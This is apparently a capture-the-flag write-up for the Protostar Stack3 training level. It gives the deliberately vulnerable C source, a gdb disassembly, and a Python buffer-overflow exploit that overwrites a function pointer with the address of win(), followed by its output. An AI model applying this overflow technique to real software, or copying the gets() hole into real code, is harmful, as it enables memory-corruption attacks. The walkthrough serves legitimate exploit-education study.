# Stack3 Solution

## C Code

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

* both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Exploit

In this C code, there are **two functions**. `main()`, and `win()`. Our **target is to get to** the `win()` function by overwriting the `fp` **function pointer**. To do that, we have to **find the memory address** of `win()`, then append that to **the padding used to fill** up `buffer` by exploiting the `gets()` function with a **buffer overflow attack**, as we have done before. To find the memory address of `fp`, we need to use a debugger like **GDB**.

First, we need to open `stack3` with `gdb`. Run this command to do that.

```bash
user@protostar:/opt/protostar/bin$ stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) 
```

Now while in the **GDB debugger**, to disassemble the `main()` function, enter these commands:

```bash
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) 
```

This **disassembles** the `main()` function into **intel assembly**. This command is very useful for getting **memory addresses of instructions** and **reverse engineering**, but that is not what we are here for. We need the **memory address of** the `win()` function.

To get the **memory address** of the `win()` function, enter this command.

```bash
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
```

What this command does essentially is just **print** (`p`) out the `win()` function (`win`). This is just **shortened** to `p win`.

Now that we have the memory address (`0x8048424`), we can just **pad** `buffer` and **attach the address** to jump to the `win()` function, **completing our challenge!**

Here is the exploit code (`/tmp/exploit.py`):

```python
import struct

padding = "A" * 64
win_func = struct.pack("I", 0x8048424)

print(padding + win_func)
```

**To run**: 

```bash
python /tmp/exploit.py | /opt/protostar/bin/stack3
```

**Result**:

```bash
calling function pointer, jumping to 0x8048424
code flow successfully changed
```

## Resources

* [C Code](https://exploit.education/protostar/stack-three/)
* [GDB Tutorial by NeuralNine](https://www.youtube.com/watch?v=ny6y0pPO--4&ab_channel=NeuralNine)